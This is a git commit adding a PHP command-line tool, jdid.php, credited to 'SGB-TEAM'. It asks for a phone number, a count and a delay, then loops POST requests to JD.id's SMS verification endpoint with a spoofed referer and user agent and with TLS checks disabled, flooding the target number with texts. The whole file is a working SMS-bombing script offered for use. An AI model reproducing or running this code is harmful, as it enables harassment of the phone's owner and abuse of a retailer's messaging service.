d1fc5dcc74681f734999ea70fa85a29977246854
Kyuoko <33697576+kyuoko@users.noreply.github.com>
2018-01-02 19:52:20 +0700

    Add files via upload

---
+++ jdid.php
@@ -0,0 +1,43 @@
+<?php
+function jdidbom($no, $jum, $wait){
+    $x = 0; 
+    while($x < $jum) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL,"http://sc.jd.id/phone/sendPhoneSms");
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=".$no."&smsType=1");
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($ch, CURLOPT_REFERER, 'http://sc.jd.id/phone/bindingPhone.html');
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
+        $server_output = curl_exec ($ch);
+        curl_close ($ch);
+		echo $server_output."\n";
+        sleep($wait);
+        $x++;
+        flush();
+    }
+}
+print "===================================================\n";
+print " _____ ______ _____      _____ _____  ___  ___  ___\n";
+print "|  __ \|  ___/  ___|    |_   _|  ___|/ _ \ |  \/  |\n";
+print "| |  \/| |_  \ `--. ______| | | |__ / /_\ \| .  . |\n";
+print "| | __ |  _|  `--. \______| | |  __||  _  || |\/| |\n";
+print "| |_\ \| |   /\__/ /      | | | |___| | | || |  | |\n";
+print " \____/\_|   \____/       \_/ \____/\_| |_/\_|  |_/\n";
+print "===================================================\n";
+print "     Thx For SGB-TEAM And All Member SGB TEAM\n";
+print "===================================================\n";
+
+echo "Nomor? (ex : 8xxxx)\nInput : ";
+$nomor = trim(fgets(STDIN));
+echo "Jumlah?\nInput : ";
+$jumlah = trim(fgets(STDIN));
+echo "Jeda? 0-9999999999 (ex:0)\nInput : ";
+$jeda = trim(fgets(STDIN));
+$execute = jdidbom($nomor, $jumlah, $jeda);
+print $execute;
+print "DONE ALL SEND\n";
+?>
